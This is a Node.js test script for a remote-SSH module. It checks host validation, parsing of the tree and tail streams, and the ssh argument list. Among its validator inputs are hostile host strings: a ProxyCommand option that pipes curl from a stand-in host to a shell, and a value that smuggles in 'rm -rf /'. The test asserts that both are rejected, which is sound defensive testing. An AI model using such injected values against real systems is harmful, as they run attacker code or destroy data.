// Verifies the remote-SSH source: host validation, the two fetch framings,
// and that a remote source produces byte-identical sessions to a local one.
// Run: node scripts/remote-check.mjs
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readWindowStates, validHost } from "../src/window-state.mjs";

// --- validHost ------------------------------------------------------------
assert.equal(validHost("192.168.2.6"), "192.168.2.6", "a plain host passes");
assert.equal(validHost("pi@192.168.2.6"), "pi@192.168.2.6", "user@host passes");
assert.equal(validHost("beast.local"), "beast.local", "a dotted name passes");
// A leading dash is an ssh *option*, not a host: `-oProxyCommand=...` would
// run locally. execFile does not help — the parsing is ssh's own.
assert.equal(validHost("-oProxyCommand=curl evil|sh"), null, "a leading dash is rejected");
assert.equal(validHost("host; rm -rf /"), null, "shell metacharacters are rejected");
assert.equal(validHost("host name"), null, "a space is rejected");
assert.equal(validHost(""), null, "empty is rejected");
assert.equal(validHost(undefined), null, "absent is null, not a throw");
assert.equal(validHost(42), null, "a non-string is null, not a throw");

// --- readWindowStates carries host ---------------------------------------
const dir = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir, `${process.pid}.json`),
  JSON.stringify({ folders: ["/home/pi/x"], focused: false, activeSessionId: null, host: "192.168.2.6" })
);
const [win] = readWindowStates(dir);
assert.equal(win.host, "192.168.2.6", "a published host is returned");

const dir2 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir2, `${process.pid}.json`),
  JSON.stringify({ folders: ["/x"], focused: false, activeSessionId: null, host: "-oProxyCommand=x" })
);
assert.equal(readWindowStates(dir2)[0].host, null, "a hostile host is dropped, the window is kept");

const dir3 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(join(dir3, `${process.pid}.json`), JSON.stringify({ folders: ["/x"], focused: true }));
assert.equal(readWindowStates(dir3)[0].host, null, "a window with no host reads null, not undefined");

// --- call 1 framing -------------------------------------------------------
import { sshArgs, splitTreeStream } from "../src/remote-fs.mjs";

const treeStream = Buffer.concat([
  Buffer.from("2187779\n1\n412\n---\n"),
  Buffer.from("TAR-BYTES-\x00\x01\x02"),
]);
const split = splitTreeStream(treeStream);
assert.deepEqual([...split.pids].sort((a, b) => a - b), [1, 412, 2187779], "pids parse");
assert.equal(split.tar.toString("binary"), "TAR-BYTES-\x00\x01\x02", "tar bytes survive the split byte-exact");

// A separator inside the tar payload must not re-split: only the first wins.
const twice = splitTreeStream(Buffer.from("7\n---\nA\n---\nB"));
assert.equal(twice.tar.toString(), "A\n---\nB", "only the first separator splits the stream");

// A host that answered nothing is empty, never a throw.
assert.deepEqual([...splitTreeStream(Buffer.alloc(0)).pids], [], "an empty stream has no pids");
assert.equal(splitTreeStream(Buffer.alloc(0)).tar.length, 0, "an empty stream has no tar");

// --- ssh argv -------------------------------------------------------------
const argv = sshArgs("192.168.2.6", "/tmp/cm/%r@%h:%p");
assert.equal(argv.at(-1), "192.168.2.6", "the host is the last argument");
assert.equal(argv.at(-2), "--", "the host is passed after --, so a dash cannot become an option");
assert.ok(argv.includes("BatchMode=yes"), "never prompts for a password");
assert.ok(argv.includes("ConnectTimeout=5"), "a dead host fails fast");

// --- call 2 framing -------------------------------------------------------
import { parseTails } from "../src/remote-fs.mjs";

// A short file: the declared size is the whole file, so `whole` is true and
// absence in the lines is absence in the file.
const short = Buffer.from("4\na\nb\n");
const shortOut = parseTails(short, ["/p/a.jsonl"]);
assert.deepEqual(shortOut.get("/p/a.jsonl"), { lines: ["a", "b", ""], whole: true }, "a short file is whole");

// A long file: 65536 bytes sent, a larger size declared. `whole` must be false
// even though the payload is exactly the tail window — this is the case that
// makes startedEmpty lie if it is got wrong.
const body = "x".repeat(65536);
const long = Buffer.concat([Buffer.from("233880\n"), Buffer.from(body)]);
assert.equal(parseTails(long, ["/p/b.jsonl"]).get("/p/b.jsonl").whole, false, "a truncated tail is not whole");

// Exactly at the boundary: 65536 bytes is still the whole file.
const exact = Buffer.concat([Buffer.from("65536\n"), Buffer.from(body)]);
assert.equal(parseTails(exact, ["/p/c.jsonl"]).get("/p/c.jsonl").whole, true, "65536 bytes exactly is whole");

// Several files in one stream, read in the order they were asked for.
const many = Buffer.concat([Buffer.from("2\nA\n"), Buffer.from("2\nB\n")]);
const manyOut = parseTails(many, ["/p/x.jsonl", "/p/y.jsonl"]);
assert.deepEqual(manyOut.get("/p/x.jsonl").lines, ["A", ""], "the first file's bytes stop at its declared size");
assert.deepEqual(manyOut.get("/p/y.jsonl").lines, ["B", ""], "the second file starts where the first ended");

// wc -c pads on some systems.
assert.equal(parseTails(Buffer.from("      2\nA\n"), ["/p/z.jsonl"]).get("/p/z.jsonl").whole, true, "a padded count parses");

// A missing file reports 0 and consumes nothing.
const missing = parseTails(Buffer.from("0\n2\nB\n"), ["/p/gone.jsonl", "/p/y.jsonl"]);
assert.deepEqual(missing.get("/p/gone.jsonl"), { lines: [], whole: false }, "a missing file is unknown, not empty");
assert.deepEqual(missing.get("/p/y.jsonl").lines, ["B", ""], "and the next file still parses");

// A truncated stream yields unknown for what never arrived.
const cut = parseTails(Buffer.from("5\nab"), ["/p/cut.jsonl"]);
assert.deepEqual(cut.get("/p/cut.jsonl"), { lines: [], whole: false }, "a stream that stopped mid-file is unknown");

console.log("remote-check: OK");
